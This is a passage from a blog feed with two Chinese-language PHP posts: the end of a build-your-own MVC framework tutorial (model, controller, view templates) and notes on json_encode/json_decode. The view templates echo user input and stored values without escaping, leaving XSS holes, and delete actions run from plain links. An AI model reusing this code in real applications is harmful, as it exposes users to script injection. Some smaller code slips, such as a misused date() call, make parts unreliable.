$defaultFooter = APP_PATH . &apos;application/views/footer.php&apos;;</div><div class="line"></div><div class="line">        $controllerHeader = APP_PATH . &apos;application/views/&apos; . $this-&gt;_controller . &apos;/header.php&apos;;</div><div class="line">        $controllerFooter = APP_PATH . &apos;application/views/&apos; . $this-&gt;_controller . &apos;/footer.php&apos;;</div><div class="line">        $controllerLayout = APP_PATH . &apos;application/views/&apos; . $this-&gt;_controller . &apos;/&apos; . $this-&gt;_action . &apos;.php&apos;;</div><div class="line"></div><div class="line">        // 页头文件</div><div class="line">        if (file_exists($controllerHeader)) &#123;</div><div class="line">            include ($controllerHeader);</div><div class="line">        &#125; else &#123;</div><div class="line">            include ($defaultHeader);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        //判断视图文件是否存在</div><div class="line">        if (file_exists($controllerLayout)) &#123;</div><div class="line">            include ($controllerLayout);</div><div class="line">        &#125; else &#123;</div><div class="line">            echo &quot;&lt;h1&gt;无法找到视图文件&lt;/h1&gt;&quot;;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        // 页脚文件</div><div class="line">        if (file_exists($controllerFooter)) &#123;</div><div class="line">            include ($controllerFooter);</div><div class="line">        &#125; else &#123;</div><div class="line">            include ($defaultFooter);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这样我们的核心的PHP MVC框架就编写完成了，下面我们开始编写应用来测试框架功能。</p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="数据库部署"><a href="#数据库部署" class="headerlink" title="数据库部署"></a>数据库部署</h3><p>在 SQL 中新建一个 mydb 数据库，使用下面的语句增加 item 数据表并插入2条记录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">CREATE DATABASE ` mydb ` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</div><div class="line">USE ` mydb `;</div><div class="line">CREATE TABLE `item` (</div><div class="line">    `id` int(11) NOT NULL auto_increment,</div><div class="line">    `item_name` varchar(255) NOT NULL,</div><div class="line">    PRIMARY KEY (`id`)</div><div class="line">) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;</div><div class="line">INSERT INTO `item` VALUES(1, &apos;Hello World.&apos;);</div><div class="line">INSERT INTO `item` VALUES(2, &apos;Lets go!&apos;);</div></pre></td></tr></table></figure>
<h3 id="部署模型"><a href="#部署模型" class="headerlink" title="部署模型"></a>部署模型</h3><p> models 目录中创建一个 ItemModel.php 模型，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">/**</div><div class="line"> * 用户Model</div><div class="line"> */</div><div class="line">class ItemModel extends Model</div><div class="line">&#123;</div><div class="line">    /**</div><div class="line">     * 自定义当前模型操作的数据库表名称，</div><div class="line">     * 如果不指定，默认为类名称的小写字符串，</div><div class="line">     * 这里就是 item 表</div><div class="line">     * @var string</div><div class="line">     */</div><div class="line">    protected $table = &apos;item&apos;;</div><div class="line"></div><div class="line">    /**</div><div class="line">     * 搜索功能，因为Sql父类里面没有现成的like搜索，</div><div class="line">     * 所以需要自己写SQL语句，对数据库的操作应该都放</div><div class="line">     * 在Model里面，然后提供给Controller直接调用</div><div class="line">     * @param $title string 查询的关键词</div><div class="line">     * @return array 返回的数据</div><div class="line">     */</div><div class="line">    public function search($keyword)</div><div class="line">    &#123;</div><div class="line">        $sql = &quot;select * from `$this-&gt;table` where `item_name` like :keyword&quot;;</div><div class="line">        $sth = Db::pdo()-&gt;prepare($sql);</div><div class="line">        $sth = $this-&gt;formatParam($sth, [&apos;:keyword&apos; =&gt; &quot;%$keyword%&quot;]);</div><div class="line">        $sth-&gt;execute();</div><div class="line"></div><div class="line">        return $sth-&gt;fetchAll();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>模型内容为空。因为 Item 模型继承了 Model，所以它拥有 Model 的所有功能。</p>
<h3 id="部署控制器"><a href="#部署控制器" class="headerlink" title="部署控制器"></a>部署控制器</h3><p>在 controllers 目录下创建一个 ItemController.php 控制器，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"> </div><div class="line">class ItemController extends Controller</div><div class="line">&#123;</div><div class="line">    // 首页方法，测试框架自定义DB查询</div><div class="line">    public function index()</div><div class="line">    &#123;</div><div class="line">        $keyword = isset($_GET[&apos;keyword&apos;]) ? $_GET[&apos;keyword&apos;] : &apos;&apos;;</div><div class="line"></div><div class="line">        if ($keyword) &#123;</div><div class="line">            $items = (new ItemModel())-&gt;search($keyword);</div><div class="line">        &#125; else &#123;</div><div class="line">            // 查询所有内容，并按倒序排列输出</div><div class="line">            // where()方法可不传入参数，或者省略</div><div class="line">            $items = (new ItemModel)-&gt;where()-&gt;order([&apos;id DESC&apos;])-&gt;fetchAll();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $this-&gt;assign(&apos;title&apos;, &apos;全部条目&apos;);</div><div class="line">        $this-&gt;assign(&apos;keyword&apos;, $keyword);</div><div class="line">        $this-&gt;assign(&apos;items&apos;, $items);</div><div class="line">        $this-&gt;render();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 查看单条记录详情</div><div class="line">    public function detail($id)</div><div class="line">    &#123;</div><div class="line">        // 通过?占位符传入$id参数</div><div class="line">        $item = (new ItemModel())-&gt;where([&quot;id = ?&quot;], [$id])-&gt;fetch();</div><div class="line"></div><div class="line">        $this-&gt;assign(&apos;title&apos;, &apos;条目详情&apos;);</div><div class="line">        $this-&gt;assign(&apos;item&apos;, $item);</div><div class="line">        $this-&gt;render();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    // 添加记录，测试框架DB记录创建（Create）</div><div class="line">    public function add()</div><div class="line">    &#123;</div><div class="line">        $data[&apos;item_name&apos;] = $_POST[&apos;value&apos;];</div><div class="line">        $count = (new ItemModel)-&gt;add($data);</div><div class="line"></div><div class="line">        $this-&gt;assign(&apos;title&apos;, &apos;添加成功&apos;);</div><div class="line">        $this-&gt;assign(&apos;count&apos;, $count);</div><div class="line">        $this-&gt;render();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    // 操作管理</div><div class="line">    public function manage($id = 0)</div><div class="line">    &#123;</div><div class="line">        $item = array();</div><div class="line">        if ($id) &#123;</div><div class="line">            // 通过名称占位符传入参数</div><div class="line">            $item = (new ItemModel())-&gt;where([&quot;id = :id&quot;], [&apos;:id&apos; =&gt; $id])-&gt;fetch();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $this-&gt;assign(&apos;title&apos;, &apos;管理条目&apos;);</div><div class="line">        $this-&gt;assign(&apos;item&apos;, $item);</div><div class="line">        $this-&gt;render();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    // 更新记录，测试框架DB记录更新（Update）</div><div class="line">    public function update()</div><div class="line">    &#123;</div><div class="line">        $data = array(&apos;id&apos; =&gt; $_POST[&apos;id&apos;], &apos;item_name&apos; =&gt; $_POST[&apos;value&apos;]);</div><div class="line">        $count = (new ItemModel)-&gt;where([&apos;id = :id&apos;], [&apos;:id&apos; =&gt; $data[&apos;id&apos;]])-&gt;update($data);</div><div class="line"></div><div class="line">        $this-&gt;assign(&apos;title&apos;, &apos;修改成功&apos;);</div><div class="line">        $this-&gt;assign(&apos;count&apos;, $count);</div><div class="line">        $this-&gt;render();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    // 删除记录，测试框架DB记录删除（Delete）</div><div class="line">    public function delete($id = null)</div><div class="line">    &#123;</div><div class="line">        $count = (new ItemModel)-&gt;delete($id);</div><div class="line"></div><div class="line">        $this-&gt;assign(&apos;title&apos;, &apos;删除成功&apos;);</div><div class="line">        $this-&gt;assign(&apos;count&apos;, $count);</div><div class="line">        $this-&gt;render();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="部署视图"><a href="#部署视图" class="headerlink" title="部署视图"></a>部署视图</h3><p>在 views 目录下新建 header.php 和 footer.php 两个页头页脚模板，内容如下。</p>
<p>header.php，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</div><div class="line">    &lt;title&gt;&lt;?php echo $title ?&gt;&lt;/title&gt;</div><div class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/main.css&quot; type=&quot;text/css&quot; /&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;h1&gt;&lt;?php echo $title ?&gt;&lt;/h1&gt;</div></pre></td></tr></table></figure></p>
<p>然后，在 views/item 创建以下几个视图文件。<br>index.php，浏览数据库内 item 表的所有记录，内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</div><div class="line">    &lt;input type=&quot;text&quot; value=&quot;&lt;?php echo $keyword ?&gt;&quot; name=&quot;keyword&quot;&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;p&gt;&lt;a href=&quot;/item/manage&quot;&gt;新建&lt;/a&gt;&lt;/p&gt;</div><div class="line"></div><div class="line">&lt;table&gt;</div><div class="line">    &lt;tr&gt;</div><div class="line">        &lt;th&gt;ID&lt;/th&gt;</div><div class="line">        &lt;th&gt;内容&lt;/th&gt;</div><div class="line">        &lt;th&gt;操作&lt;/th&gt;</div><div class="line">    &lt;/tr&gt;</div><div class="line">    &lt;?php foreach ($items as $item): ?&gt;</div><div class="line">        &lt;tr&gt;</div><div class="line">            &lt;td&gt;&lt;?php echo $item[&apos;id&apos;] ?&gt;&lt;/td&gt;</div><div class="line">            &lt;td&gt;</div><div class="line">                &lt;a href=&quot;/item/detail/&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot; title=&quot;查看详情&quot;&gt;</div><div class="line">                    &lt;?php echo $item[&apos;item_name&apos;] ?&gt;</div><div class="line">                &lt;/a&gt;</div><div class="line">            &lt;/td&gt;</div><div class="line">            &lt;td&gt;</div><div class="line">                &lt;a href=&quot;/item/manage/&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot;&gt;编辑&lt;/a&gt;</div><div class="line">                &lt;a href=&quot;/item/delete/&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot;&gt;删除&lt;/a&gt;</div><div class="line">            &lt;/td&gt;</div><div class="line">        &lt;/tr&gt;</div><div class="line">    &lt;?php endforeach ?&gt;</div><div class="line">&lt;/table&gt;</div></pre></td></tr></table></figure>
<p>add.php，添加记录，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a class=&quot;big&quot; href=&quot;/item/index&quot;&gt;成功添加&lt;?php echo $count ?&gt;条记录，点击返回&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>delete.php，删除记录，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;/item/index&quot;&gt;成功删除&lt;?php echo $count ?&gt;项，点击返回&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>update.php 更新记录，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a class=&quot;big&quot; href=&quot;/item/index&quot;&gt;成功修改&lt;?php echo $count ?&gt;项，点击返回&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>manage.php 编辑记录，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;form  &lt;?php if (isset($item[&apos;id&apos;])) &#123; ?&gt;</div><div class="line">            action=&quot;/item/update/&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot;</div><div class="line">        &lt;?php &#125; else &#123; ?&gt;</div><div class="line">            action=&quot;/item/add&quot;</div><div class="line">        &lt;?php &#125; ?&gt;</div><div class="line">      method=&quot;post&quot;&gt;</div><div class="line"></div><div class="line">    &lt;?php if (isset($item[&apos;id&apos;])): ?&gt;</div><div class="line">        &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot;&gt;</div><div class="line">    &lt;?php endif; ?&gt;</div><div class="line">    &lt;input type=&quot;text&quot; name=&quot;value&quot; value=&quot;&lt;?php echo isset($item[&apos;item_name&apos;]) ? $item[&apos;item_name&apos;] : &apos;&apos; ?&gt;&quot;&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;a class=&quot;big&quot; href=&quot;/item/index&quot;&gt;返回&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>detail.php 显示记录，内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ID：&lt;?php echo $item[&apos;id&apos;] ?&gt;&lt;br /&gt;</div><div class="line">Name：&lt;?php echo isset($item[&apos;item_name&apos;]) ? $item[&apos;item_name&apos;] : &apos;&apos; ?&gt;</div><div class="line"></div><div class="line">&lt;br /&gt;</div><div class="line">&lt;br /&gt;</div><div class="line">&lt;a class=&quot;big&quot; href=&quot;/item/index&quot;&gt;返回&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<h2 id="应用测试"><a href="#应用测试" class="headerlink" title="应用测试"></a>应用测试</h2><p>直接访问　<a href="http://localhost/" target="_blank" rel="external">http://localhost/</a></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/mvc2.png" alt=""></p>
<h2 id="Github-Links"><a href="#Github-Links" class="headerlink" title="Github Links"></a>Github Links</h2><p><a href="https://github.com/uknowsec/myphp-frame" target="_blank" rel="external">Github myphp-frame</a></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.cnblogs.com/Steven-shi/p/5914175.html" target="_blank" rel="external">编写自己的PHP MVC框架笔记</a><br><a href="https://www.awaimai.com/128.html" target="_blank" rel="external">手把手编写PHP MVC框架实例教程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP&amp;JSON 学习笔记</title>
    <link href="http://uknowsec.cn/posts/notes/PHP-JSON-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>http://uknowsec.cn/posts/notes/PHP-JSON-学习笔记.html</id>
    <published>2017-10-18T12:47:45.000Z</published>
    <updated>2017-10-19T02:24:05.069Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="JSON介绍"><a href="#JSON介绍" class="headerlink" title="JSON介绍"></a>JSON介绍</h2><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式</p>
<h3 id="JSON格式"><a href="#JSON格式" class="headerlink" title="JSON格式"></a>JSON格式</h3><ul>
<li>1） 并列的数据之间用逗号（”, “）分隔。</li>
<li>2） 映射用冒号（”: “）表示。</li>
<li>3） 并列数据的集合（数组）用方括号(“[]”)表示。</li>
<li>4） 映射的集合（对象）用大括号（”{}”）表示</li>
</ul>
<h2 id="PHP-amp-JSON"><a href="#PHP-amp-JSON" class="headerlink" title="PHP&amp;JSON"></a>PHP&amp;JSON</h2><h3 id="JSON函数"><a href="#JSON函数" class="headerlink" title="JSON函数"></a>JSON函数</h3><table>
<thead>
<tr>
<th>函数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>json_encode</td>
<td style="text-align:center">对变量进行 JSON 编码</td>
</tr>
<tr>
<td>json_decode</td>
<td style="text-align:center">对 JSON 格式的字符串进行解码，转换为 PHP 变量</td>
</tr>
</tbody>
</table>
<h4 id="json-encode"><a href="#json-encode" class="headerlink" title="json_encode"></a>json_encode</h4><p>PHP json_encode() 用于对变量进行 JSON 编码，该函数如果执行成功返回 JSON 数据，否则返回 FALSE 。</p>
<h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string json_encode ( $value [, $options = 0 ] )</div></pre></td></tr></table></figure>
<h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><ul>
<li>value: 要编码的值。该函数只对 UTF-8 编码的数据有效。</li>
<li>options:由以下常量组成的二进制掩码：JSON_HEX_QUOT, JSON_HEX_TAG, JSON_HEX_AMP, JSON_HEX_APOS, JSON_NUMERIC_CHECK,JSON_PRETTY_PRINT, JSON_UNESCAPED_SLASHES, JSON_FORCE_OBJECT</li>
</ul>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>以下实例演示了如何将 PHP 数组转换为 JSON 格式数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">   $arr = array(&apos;a&apos; =&gt; 1, &apos;b&apos; =&gt; 2, &apos;c&apos; =&gt; 3, &apos;d&apos; =&gt; 4, &apos;e&apos; =&gt; 5);</div><div class="line">   echo json_encode($arr);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>以上代码执行结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;</div></pre></td></tr></table></figure>
<p>以下实例演示了如何将 PHP 对象转换为 JSON 格式数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">   class Emp &#123;</div><div class="line">       public $name = &quot;&quot;;</div><div class="line">       public $hobbies  = &quot;&quot;;</div><div class="line">       public $birthdate = &quot;&quot;;</div><div class="line">   &#125;</div><div class="line">   $e = new Emp();</div><div class="line">   $e-&gt;name = &quot;sachin&quot;;</div><div class="line">   $e-&gt;hobbies  = &quot;sports&quot;;</div><div class="line">   $e-&gt;birthdate = date(&apos;m/d/Y h:i:s a&apos;, &quot;8/5/1974 12:20:03 p&quot;);</div><div class="line">   $e-&gt;birthdate = date(&apos;m/d/Y h:i:s a&apos;, strtotime(&quot;8/5/1974 12:20:03&quot;));</div><div class="line"></div><div class="line">   echo json_encode($e);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>以上代码执行结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;name&quot;:&quot;sachin&quot;,&quot;hobbies&quot;:&quot;sports&quot;,&quot;birthdate&quot;:&quot;08\/05\/1974 12:20:03 pm&quot;&#125;</div></pre></td></tr></table></figure>
<h4 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h4><p>PHP json_decode() 函数用于对 JSON 格式的字符串进行解码，并转换为 PHP 变量。</p>
<h5 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed json_decode ($json [,$assoc = false [, $depth = 512 [, $options = 0 ]]])</div></pre></td></tr></table></figure>
<h5 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h5><ul>
<li>json_string: 待解码的 JSON 字符串，必须是 UTF-8 编码数据</li>
<li>assoc: 当该参数为 TRUE 时，将返回数组，FALSE 时返回对象。</li>
<li>depth: 整数类型的参数，它指定递归深度</li>
<li>options: 二进制掩码，目前只支持 JSON_BIGINT_AS_STRING 。</li>
</ul>
<h5 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h5><p>以下实例演示了如何解码 JSON 数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">   $json = &apos;&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;&apos;;</div><div class="line"></div><div class="line">   var_dump(json_decode($json));</div><div class="line">   var_dump(json_decode($json, true));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>以上代码执行结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">object(stdClass)#1 (5) &#123;</div><div class="line">    [&quot;a&quot;] =&gt; int(1)</div><div class="line">    [&quot;b&quot;] =&gt; int(2)</div><div class="line">    [&quot;c&quot;] =&gt; int(3)</div><div class="line">    [&quot;d&quot;] =&gt; int(4)</div><div class="line">    [&quot;e&quot;] =&gt; int(5)</div><div class="line">&#125;</div><div class="line"></div><div class="line">array(5) &#123;</div><div class="line">    [&quot;a&quot;] =&gt; int(1)</div><div class="line">    [&quot;b&quot;] =&gt; int(2)</div><div class="line">    [&quot;c&quot;] =&gt; int(3)</div><div class="line">    [&quot;d&quot;] =&gt; int(4)</div><div class="line">    [&quot;e&quot;] =&gt; int(5)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="PHP-amp-JSON中文显示问题"><a href="#PHP-amp-JSON中文显示问题" class="headerlink" title="PHP&amp;JSON中文显示问题"></a>PHP&amp;JSON中文显示问题</h3><h4 id="PHP输出JSON格式"><a href="#PHP输出JSON格式" class="headerlink" title="PHP输出JSON格式"></a>PHP输出JSON格式</h4><p>把数组直接输出为JSON</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$arr = array(&apos;姓名&apos;=&gt;&apos;小李&apos;,&apos;年龄&apos;=&gt;&apos;18&apos;);</div><div class="line">$json = json_encode($arr);</div><div class="line">echo $json;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>输出的结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;\u59d3\u540d&quot;:&quot;\u5c0f\u674e&quot;,&quot;\u5e74\u9f84&quot;:&quot;18&quot;&#125;</div></pre></td></tr></table></figure>
<p>中文字符被编码成了Unicode</p>
<p>做如下处理，把输出结果匹配一下，把Unicode还原成了汉字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$arr = array(&apos;姓名&apos;=&gt;&apos;小李&apos;,&apos;年龄&apos;=&gt;&apos;18&apos;);</div><div class="line">$json = json_encode($arr);</div><div class="line">echo $json;</div><div class="line">echo &apos;&lt;/br&gt;&apos;;</div><div class="line">echo decodeUnicode($json);</div><div class="line"> </div><div class="line">function decodeUnicode($str)&#123;</div><div class="line">  return preg_replace_callback(&apos;/\\\\u([0-9a-f]&#123;4&#125;)/i&apos;,</div><div class="line">    create_function(</div><div class="line">      &apos;$matches&apos;,</div><div class="line">      &apos;return mb_convert_encoding(pack(&quot;H*&quot;, $matches[1]), &quot;UTF-8&quot;, &quot;UCS-2BE&quot;);&apos;</div><div class="line">    ),</div><div class="line">    $str);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>输出的结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;\u59d3\u540d&quot;:&quot;\u5c0f\u674e&quot;,&quot;\u5e74\u9f84&quot;:&quot;18&quot;&#125;</div><div class="line">&#123;&quot;姓名&quot;:&quot;小李&quot;,&quot;年龄&quot;:&quot;18&quot;&#125;</div></pre></td></tr></table></figure>
<p>同时PHP5.4版本，已经给Json新增了一个选项: JSON_UNESCAPED_UNICODE。加上这个选项后，就不会自动把中文编码了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$arr = array(&apos;姓名&apos;=&gt;&apos;小李&apos;,&apos;年龄&apos;=&gt;&apos;18&apos;);</div><div class="line">$json = json_encode($arr, JSON_UNESCAPED_UNICODE);</div><div class="line">echo $json;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>输出的结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;姓名&quot;:&quot;小李&quot;,&quot;年龄&quot;:&quot;18&quot;&#125;</div></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.runoob.com/php/php-json.html" target="_blank" rel="external">PHP JSON | 菜鸟教程</a><br><a href="http://www.ruanyifeng.com/blog/2009/05/data_types_and_json.html" target="_blank" rel="external">数据类型和Json格式</a></p>
]]></content>
    
    <summary type="html">
    
